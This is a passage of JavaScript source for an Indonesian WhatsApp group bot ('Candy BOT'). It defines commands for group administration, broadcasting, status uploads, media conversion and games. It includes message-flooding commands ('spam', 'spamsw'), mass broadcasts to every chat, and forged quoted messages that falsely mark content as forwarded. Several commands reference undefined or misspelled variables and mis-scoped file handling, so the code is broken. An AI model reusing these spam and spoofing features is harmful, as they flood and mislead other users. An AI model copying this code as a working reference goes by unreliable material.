_Note : Bot Ini Menggunakan Autoread Terhadap Pesan Yang Pengguna Kirim_

Creator : Nathan || @${send.split("@")[0]}`)
sendButImage(from, syarat, `Candy BOT`, gambar, [
{
      buttonId: `${prefix}owner`,
      buttonText: {
        displayText: `OWNER`,
      },
      type: 1,
    },
  ], {quoted: ftroli, thumbnail: fs.readFileSync(`./logoku.jpg`), contextInfo: { forwardingScore: 99999, isForwarded: true }})
				case 'readmore':
			    	case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(mess.error.api)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
                    case 'delchat':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                reply('Berhasil Menghapus Chat' + from)
                await sleep(4000)
                nathan.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					anu = await nathan.chats.all()
					nathan.setMaxListeners(10)
					for (let _ of anu) {
						nathan.deleteChat(_.jid)
					}
					reply('Berhasil Membersihkan Chat')
					break
					case 'mute':
			    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot Telah Dimute Di Grup Ini')
                break
					case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
reply(`_Restarting ${NamaBot}_`)
exec(`cd && node index`)
sleep(4000)
reply('Sukses')
break
				case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await nathan.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						nathan.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:ftroli})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await nathan.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						nathan.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: ftroli})
						fs.unlinkSync(median)
				break
				 case 'antilink':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antilink 1`)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Antilink Sudah Aktif Sebelumnya')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Berhasil Mengaktifkan antilink')
						nathan.sendMessage(from, `ALERT!!! Group Ini Sudah Di Pasang AntiLink\nJika Kamu Melanggar Maka Akan Saya Kick`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Antilink Sudah Dinonaktifkan Sebelumnya')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Berhasil Menonaktifkan antilink')
					} else {
						reply('1 Untuk Mengaktifkan, 0 Untuk Menonaktifkan')
					}
					break
					case 'sethumb':
									if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
									choubowo = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
									delb = await nathan.downloadMediaMessage(choubowo)
									fs.writeFileSync('./thumb.jpg', delb)
									gantiaengab = fs.readFileSync('./thumb.jpg')
									await sleep(5000)
									reply(`Sukses`)
									break
				 case 'nsfw':
	        if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('NFSW Sudah Aktif Sebelumnya')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Berhasil Mengaktifkan NSFW')
						nathan.sendMessage(from, `Bebas Cari Hentong`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Sudah Mati ')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Berhasil Menonaktifkan NSFW')
					} else {
						reply('1 Untuk Mengaktifkan, 0 Untuk Menonaktifkan')
					}
					break
				case 'tinyurl':
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'sharelock':
lokasi = `${args.join(' ')}`
nama = lokasi.split("|")[0];
alamat = lokasi.split("|")[1];
nathan.sendMessage(from, {
name: nama,
address: alamat,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
break
case 'tts':
					if (args.length < 1) return nathan.sendMessage(from, `Kode Bahasanya Mana? contoh : ${prefix}tts id yamet kudasi`, text, { quoted: ftroli })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return nathan.sendMessage(from, `Teksnya Mana? Contoh : ${prefix}tts id yamet kudasi`, text, { quoted: ftroli })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks Terlalu Panjang')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								nathan.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: ftroli })
								fs.unlinkSync(rano)
							})
						})
					break
				case 'demote':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply Target!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    nathan.groupDemoteAdmin(from, [demote])
						reply('Sukses Demote')
						break
					case 'promote':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply Target!')
			promote = mek.message.extendedTextMessage.contextInfo.participant
		    nathan.groupMakeAdmin(from, [promote])
						reply('Sukses Promote')
						break
				case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await nathan.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					nathan.sendMessage(from, yeh, text, { quoted: ftroli })
					break
					case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'revoke':
         if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
          json = ['action', 'inviteReset', from]
         nathan.query({json, expect200: true})
          reply('Sukses Revoke Link Group')
         break
					case 'opengc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                   reply(`Sukses ${command} ${groupName}`)
						nathan.groupSettingChange(from, GroupSettingChange.messageSend, false)
						break
						case 'closegc':
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
						reply(`Sukses ${command} ${groupName}`)
						nathan.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break
				case 'spam':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 100) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`Jumlah Harus Berupa Angka`)
				for (let i = 0; i < argzi[1]; i++){
					nathan.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                nathan.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                nathan.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					nathan.groupUpdateSubject(from, `${body.slice(11)}`)
					reply(`Sukses ${command} Menjadi ${body.slice(11)}`)
					break					
				case 'setdeskgc':
				case 'setdescgc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					nathan.groupUpdateDescription(from, `${body.slice(10)}`)
					reply(`Sukses ${command} Menjadi ${body.slice(10)}`)
					break
				case 'setprofile':
				case 'setpp':
				nathan.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply Image!')
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					nahhh = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					gblk = await nathan.downloadAndSaveMediaMessage(nahhh)
					await nathan.updateProfilePicture(botNumber, gblk)
					reply('Sukses')
					break
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				nathan.updatePresence(from, Presence.composing)
				nathan.groupLeave(from)
						break
						case 'bcbutton':



            if (!mek.key.fromMe && !isOwner) return ftrol(`Khusus Owner`)



            if (args.length < 1) return ftrol('Textnya Mana?')



            anu = await nathan.chats.all()



            for (let _ of anu) {



            const buttons = [{buttonId: `simi`, buttonText: {displayText: `Oke Kak`}, type: 1},{buttonId: `${prefix}owner`, buttonText: {displayText: `Owner`}, type: 1}]



            const buttonMessage = {



            headerType: "IMAGE",



            contentText: c,



            footerText: `_Candy BOT BY Nathan_`,



            buttons: buttons,



            headerType: 1



            }



            nathan.sendMessage(`${_.jid}`,



            buttonMessage,



            MessageType.buttonsMessage,



            {quoted:{key: {fromMe: false, participant: `6287834993722@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {documentMessage: {mimetype: 'application/octet-stream', title: `_Candy BOT BY Nathan_`, pageCount: 0, fileName: `Candy BOT`, jpegThumbnail: dfrply}}}, contextInfo: {"mentionedJid" : ['6287834993722@s.whatsapp.net']}})



            }



            reply('Sukses Broadcast')
            break
            case 'bertumbuk':
               if (!isGroup) return reply(mess.only.group)
               if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya Bisa Baku Hantam Dengan 1 Anggota Saja')
               if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
               if (args.length === 0) return reply(`Tag Lawan Anda Yang Ingin Anda Ajak Baku Hantam`)
               if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi Bertumbuk, Tidak Dapat Dijalankan Bersamaan\nKetik *${prefix}delbakuhantam* , Untuk Menghapus Sesi Bertumbuk`)
					
               bertumbuk = setGelud(`${from}`)
               bertumbuk.status = false
               bertumbuk.Z = sender.replace("@s.whatsapp.net", "")
               bertumbuk.Y = args[0].replace("@", "");
               fs.writeFileSync(`./media/${from}.json`, JSON.stringify(bertumbuk, null, 2))
               starGame = ` Memulai Game Baku Hantam 

� @${sender.replace("@s.whatsapp.net", "")} Menantang Baku Hantam
[ ${args[0]} ] Ketik Y/N Untuk Menerima Atau Menolak Permainan`

               nathan.sendMessage(from, starGame, text, {quoted: ftroli, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})

               break
        case 'delbakuhantam':
               if (!isGroup) return reply(mess.only.group)
               if (fs.existsSync('./media/' + from + '.json')) {
               fs.unlinkSync('./media/' + from + '.json')
               reply('Berhasil Menghapus Sesi Bertumbuk')
               } else {
               reply('Tidak Ada Sesi Bertumbuk Yang Berlangsung')
}
               break
				case 'bc':
					nathan.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Teksnya?')
					anu = await nathan.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await nathan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							nathan.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses Mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await nathan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							nathan.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses Mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await nathan.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							nathan.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 999, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses Mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses Mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
					case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`Jumlah Harus Berupa Angka`)
				for (let i = 0; i < argzi[1]; i++){
					nathan.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				case 'upswteks':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    nathan.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses Upload Status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    nathan.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NamaBot}`}, MessageType.location)
                    reply(`Sukses Upload Lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply('Reply Sticker!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await nathan.downloadMediaMessage(encmedia)
						nathan.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses Upload Sticker`)
                    break
                    case 'ultah': 
									if (args.length < 1) return reply(`Usage : #ultah tahun-bulan-tanggal\nExample : ${prefix}ultah 2009-01-03`)
									if (!args[0].includes("-")) return reply(`Usage : #ultah tahun-bulan-tanggal\nExample : ${prefix}ultah 2009-01-03`)
								    q = args.join(' ')
									qq = q
									zodiakk = [
									["Capricorn", new Date(1970, 0, 1)],
									["Aquarius", new Date(1970, 0, 20)],
									["Pisces", new Date(1970, 1, 19)],
									["Aries", new Date(1970, 2, 21)],
									["Taurus", new Date(1970, 3, 21)],
									["Gemini", new Date(1970, 4, 21)],
									["Cancer", new Date(1970, 5, 22)],
									["Leo", new Date(1970, 6, 23)],
									["Virgo", new Date(1970, 7, 23)],
									["Libra", new Date(1970, 8, 23)],
									["Scorpio", new Date(1970, 9, 23)],
									["Sagittarius", new Date(1970, 10, 22)],
									["Capricorn", new Date(1970, 11, 22)]
									].reverse()
									function getZodiac(month, day) {
										dey = new Date(1970, month - 1, day)
										return zodiakk.find(([_,_d]) => dey >= _d)[0]
										}
										dateek = new Date(qq)
										if (dateek == 'Invalid Date') throw dateek
										let dd = new Date()
										let [tahun, bulan, tanggal] = [dd.getFullYear(), dd.getMonth() + 1, dd.getDate()]
										birth = [dateek.getFullYear(), dateek.getMonth() + 1, dateek.getDate()]
										zodiackk = getZodiac(birth[1], birth[2])
										ageD = new Date(d - dateek)
										ageK = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()
										birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
										cekusia = bulan === birth[1] && tanggal === birth[2] ? `Selamat Ulang Tahun Yang Ke-${ageK} 🥳` : ageK
										reply(`
*Lahir : ${birth.join(', ')}*
*Ultah Mendatang : ${birthday.join(', ')}*
*Usia : ${cekusia}*
*Zodiak : ${zodiackk}*
`.trim())
									break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply Audio!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await nathan.downloadMediaMessage(encmedia)
						nathan.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses Upload Audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply Audio!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await nathan.downloadMediaMessage(encmedia)
						nathan.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses Upload Voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var kunti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await nathan.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    nathan.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${kunti}`})
                    reply(`Sukses Upload Video:\n${kunti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var kunti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await nathan.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    nathan.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses Upload Gif:\n${kunti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var woi = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await nathan.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    nathan.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: ftroli, caption: `${woi}`})
                    reply(`Sukses Upload Image:\n${woi}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				return nathan.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Wait Kak')
				break
				case 'tomp4':
					if (!isQuotedSticker) return reply('Reply Sticker')
                                        reply(mess.wait)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await nathan.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Reply Sticker!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
					nathan.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Reply Video')
					reply(mess.wait)
					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await nathan.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						nathan.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: ftroli })
						fs.unlinkSync(ran)
					})
					break
				case 'suit':
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 🥳",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙁",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 🙂"
					    ]
					  gunawan = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gunawan)
					} else if (args[0] === 'kertas') {
					  kertas = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 🥳",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙁",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 🙂"
					    ]
					  kera = kertas[Math.floor(Math.random() * kertas.length)]
						reply(kera)
					} else if (args[0] === 'batu') {
					  batu = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang 🥳",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙁",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 🙂"
					    ]
					  bata = batu[Math.floor(Math.random() * batu.length)]
					  reply(bata)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
		    case 'slot':
            case 'slots':
            const santuy = sotoy[Math.floor(Math.random() * sotoy.length)]
            nathan.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika Anda Mendapatkan 3 Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: ftroli })
            break
				case 'kontak':
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
				if (!isGroup) return reply(mess.only.group)
				argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'getdeskgc':
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await nathan.groupMetadata(anu)
				nathan.sendMessage(from, metadete.desc, text, {quoted:ftroli})
				  break
					case 'getbio':
	  var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await nathan.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
case 'waktu':
              reply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
              break
case 'citacita':
              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
              const cita3 = cita[Math.floor(Math.random() * cita.length)]
              cita2 = await getBuffer(cita3)
              nathan.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: ftroli})
              break
                    case 'getname':
        var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = nathan.contacts[ambl] != undefined ? nathan.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : nathan.contacts[ambl].notify || nathan.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await nathan.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            nathan.sendMessage(from, pict, image, {quoted: ftroli})
            break
				case 'chat':
			if (args[0].startsWith('08')) return reply('Awali Nomor Dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali Nomor Dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xxxxxxxxxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            nathan.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses Mengirim ${command} :\n${org},@${nomor}`)
            break
				case 'attp':
					if (!c) return reply(`Teksnya Mana?\nContoh :\n${prefix}attp ${NamaBot}`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					nathan.sendMessage(from, atetepe, sticker, { quoted: ftroli })
					break
				case 'semoji':
			if (args === 0) return reply('Emojinya?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[10].url}`
		   sendWebp(from, `${link}`).catch(() => reply('GAGAL'))
           })
    	   break
				case 'tag':
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xxxxxxxxxx`)
            var nomame = `${body.slice(5)}@s.whatsapp.net`
					tagu = `@${nomqm.split('@')[0]}` 
					nathan.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 999, isForwarded: true, mentionedJid: [nomame]}})
			break
			case 'tagme':
                  var nomame = mek.participant
				    tagmk = `@${nomqm.split('@s.whatsapp.net')[0]}`
					nathan.sendMessage(from, tagmk, text, { quoted: ftrol, contextInfo: { forwardingScore: 999, isForwarded: true, mentionedJid: [nomame]}})
					break
case 'listadmins':
  case 'listadmin':
    case 'admin':
					if (!isGroup) return reply(mess.only.group)
